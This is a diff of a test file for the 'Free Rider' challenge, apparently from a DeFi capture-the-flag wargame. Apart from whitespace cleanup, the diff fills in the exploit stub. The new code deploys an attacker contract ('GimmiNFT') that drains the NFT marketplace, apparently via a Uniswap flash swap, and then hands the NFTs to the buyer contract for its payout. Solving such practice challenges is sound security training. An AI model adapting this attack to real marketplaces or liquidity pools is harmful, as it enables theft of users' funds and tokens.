@@ -45,7 +45,7 @@ describe('[Challenge] Free Rider', function () {
             this.uniswapFactory.address,
             this.weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // Note that the function takes care of deploying the pair automatically
         await this.token.approve(
@@ -61,7 +61,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
         this.uniswapPair = await UniswapPairFactory.attach(
@@ -98,13 +98,19 @@ describe('[Challenge] Free Rider', function () {
         // Deploy buyer's contract, adding the attacker as the partner
         this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
             attacker.address, // partner
-            this.nft.address, 
+            this.nft.address,
             { value: BUYER_PAYOUT }
         );
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        this.gimmi = await (await ethers.getContractFactory("GimmiNFT", attacker)).deploy(this.uniswapPair.address, this.uniswapFactory.address, this.marketplace.address, this.buyerContract.address, this.nft.address, this.weth.address);
+        await this.gimmi.attack(await ethers.utils.parseEther("15"), this.weth.address, attacker.address, [0, 1, 2, 3, 4, 5]);
+
+        for (let i = 0; i < AMOUNT_OF_NFTS; i++) {
+            await this.nft.connect(attacker)["safeTransferFrom(address,address,uint256)"](attacker.address, this.buyerContract.address, i);
+        }
+
     });
 
     after(async function () {
